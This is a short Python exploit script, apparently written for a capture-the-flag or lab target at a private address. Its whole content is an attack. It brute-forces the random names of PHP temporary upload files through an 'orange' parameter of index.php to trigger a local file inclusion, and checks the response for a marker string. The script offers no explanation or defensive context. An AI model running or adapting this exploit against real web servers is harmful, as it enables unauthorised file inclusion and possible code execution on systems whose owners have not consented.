#!/usr/bin/env python
# -*- coding: utf-8 -*-

import requests
import random

charset = "QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm1234567890"

host = "100.100.0.3"
port = 80
base_url = "http://%s:%d" % (host, port)


def req(filename):
    url = "%s/index.php?orange=/tmp/php%s" % (
        base_url, filename)
    try:
        response = requests.get(url, timeout=1)
        if b'virink' in response.content:
            print("[+] Include success!")
            return True
    except Exception as e:
        print(e)


def brute_force_tmp_files():
    for i in range(100):
        if req(''.join(random.sample(charset, 6))):
            break


def main():
    brute_force_tmp_files()


if __name__ == "__main__":
    main()
